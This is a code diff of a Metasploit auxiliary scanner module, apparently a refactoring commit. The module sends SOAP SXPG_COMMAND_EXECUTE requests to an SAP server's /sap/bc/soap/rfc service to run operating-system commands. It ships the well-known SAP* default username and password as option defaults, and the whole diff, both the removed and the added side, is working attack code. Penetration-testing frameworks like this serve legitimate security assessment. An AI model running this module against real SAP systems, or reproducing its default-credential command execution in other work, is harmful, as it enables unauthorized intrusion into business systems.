@@ -20,106 +20,104 @@ require 'msf/core'
 
 class Metasploit4 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::Scanner
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
 
-	def initialize
-		super(
-			'Name' => 'SAP SOAP RFC SXPG_COMMAND_EXECUTE',
-			'Description' => %q{
-					This module makes use of the SXPG_COMMAND_EXECUTE Remote Function Call, through
-				the use of the /sap/bc/soap/rfc SOAP service to execute OS commands as configured
-				in the SM69 transaction.
-				},
-			'References' =>
-				[
-					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
-				],
-			'Author' =>
-				[
-					'Agnivesh Sathasivam',
-					'nmonkee'
-				],
-			'License' => MSF_LICENSE
-		)
-		register_options(
-			[
-				Opt::RPORT(8000),
-				OptString.new('CLIENT', [true, 'SAP Client', '001']),
-				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
-				OptString.new('PASSWORD', [true, 'Password', '06071992']),
-				OptString.new('CMD', [true, 'SM69 command to be executed', nil]),
-				OptString.new('PARAM', [false, 'Additional parameters for the SM69 command', nil]),
-				OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
-			], self.class)
-	end
+  def initialize
+    super(
+      'Name' => 'SAP SOAP RFC SXPG_COMMAND_EXECUTE',
+      'Description' => %q{
+          This module makes use of the SXPG_COMMAND_EXECUTE Remote Function Call, through
+        the use of the /sap/bc/soap/rfc SOAP service to execute OS commands as configured
+        in the SM69 transaction.
+        },
+      'References' =>
+        [
+          [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
+        ],
+      'Author' =>
+        [
+          'Agnivesh Sathasivam',
+          'nmonkee'
+        ],
+      'License' => MSF_LICENSE
+    )
+    register_options(
+      [
+        Opt::RPORT(8000),
+        OptString.new('CLIENT', [true, 'SAP Client', '001']),
+        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+        OptString.new('PASSWORD', [true, 'Password', '06071992']),
+        OptString.new('CMD', [true, 'SM69 command to be executed', 'PING']),
+        OptString.new('PARAM', [false, 'Additional parameters for the SM69 command', nil]),
+        OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
+      ], self.class)
+  end
 
-	def run_host(ip)
-		os = datastore['OS']
-		data = '<?xml version="1.0" encoding="utf-8" ?>'
-		data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
-		data << '<env:Body>'
-		data << '<n1:SXPG_COMMAND_EXECUTE xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
-		if datastore['PARAM']
-			data << '<ADDITIONAL_PARAMETERS>' + datastore['PARAM'] + ' </ADDITIONAL_PARAMETERS>'
-		else
-			data << '<ADDITIONAL_PARAMETERS> </ADDITIONAL_PARAMETERS>'
-		end
-		data << '<COMMANDNAME>' + datastore['CMD'] + '</COMMANDNAME>'
-		data << '<OPERATINGSYSTEM>' + os + '</OPERATINGSYSTEM>'
-		data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>'
-		data << '</n1:SXPG_COMMAND_EXECUTE>'
-		data << '</env:Body>'
-		data << '</env:Envelope>'
-		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
-		print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_COMMAND_EXECUTE request")
-		begin
-			res = send_request_raw({
-				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
-				'method' => 'POST',
-				'data' => data,
-				'headers' =>{
-					'Content-Length' => data.size.to_s,
-					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-					'Authorization' => 'Basic ' + user_pass,
-					'Content-Type' => 'text/xml; charset=UTF-8'
-					}
-				}, 45)
-			if res and res.code != 500 and res.code != 200
-				# to do - implement error handlers for each status code, 404, 301, etc.
-				print_error("[SAP] #{ip}:#{rport} - something went wrong!")
-				return
-			elsif res and res.body =~ /faultstring/
-				error = res.body.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
-				0.upto(error.length-1) do |i|
-					print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
-				end
-				return
-			elsif res
-				print_status("[SAP] #{ip}:#{rport} - got response")
-				saptbl = Msf::Ui::Console::Table.new(
-					Msf::Ui::Console::Table::Style::Default,
-						'Header' => "[SAP] SXPG_COMMAND_EXECUTE ",
-						'Prefix' => "\n",
-						'Postfix' => "\n",
-						'Indent'  => 1,
-						'Columns' =>["Output",]
-						)
-				output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
-				for i in 0..output.length-1
-					saptbl << [output[i]]
-				end
-				print(saptbl.to_s)
-				return
-			else
-				print_error("[SAP] #{ip}:#{rport} - Unknown error")
-				return
-			end
-		rescue ::Rex::ConnectionError
-			print_error("[SAP] #{ip}:#{rport} - Unable to connect")
-			return
-		end
-	end
+  def run_host(ip)
+    os = datastore['OS']
+    data = '<?xml version="1.0" encoding="utf-8" ?>'
+    data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
+    data << '<env:Body>'
+    data << '<n1:SXPG_COMMAND_EXECUTE xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
+    if datastore['PARAM']
+      data << '<ADDITIONAL_PARAMETERS>' + datastore['PARAM'] + ' </ADDITIONAL_PARAMETERS>'
+    else
+      data << '<ADDITIONAL_PARAMETERS> </ADDITIONAL_PARAMETERS>'
+    end
+    data << '<COMMANDNAME>' + datastore['CMD'] + '</COMMANDNAME>'
+    data << '<OPERATINGSYSTEM>' + os + '</OPERATINGSYSTEM>'
+    data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>'
+    data << '</n1:SXPG_COMMAND_EXECUTE>'
+    data << '</env:Body>'
+    data << '</env:Envelope>'
+    print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_COMMAND_EXECUTE request")
+    begin
+      res = send_request_cgi({
+        'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+        'method' => 'POST',
+        'data' => data,
+        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+        'ctype' => 'text/xml; charset=UTF-8',
+        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+        'headers' =>{
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+        }
+      })
+      if res and res.code != 500 and res.code != 200
+        # to do - implement error handlers for each status code, 404, 301, etc.
+        print_error("[SAP] #{ip}:#{rport} - something went wrong!")
+        return
+      elsif res and res.body =~ /faultstring/
+        error = res.body.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
+        0.upto(error.length-1) do |i|
+          print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
+        end
+        return
+      elsif res
+        print_status("[SAP] #{ip}:#{rport} - got response")
+        saptbl = Msf::Ui::Console::Table.new(
+          Msf::Ui::Console::Table::Style::Default,
+            'Header' => "[SAP] SXPG_COMMAND_EXECUTE ",
+            'Prefix' => "\n",
+            'Postfix' => "\n",
+            'Indent'  => 1,
+            'Columns' =>["Output",]
+            )
+        output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
+        for i in 0..output.length-1
+          saptbl << [output[i]]
+        end
+        print(saptbl.to_s)
+        return
+      else
+        print_error("[SAP] #{ip}:#{rport} - Unknown error")
+        return
+      end
+    rescue ::Rex::ConnectionError
+      print_error("[SAP] #{ip}:#{rport} - Unable to connect")
+      return
+    end
+  end
 end
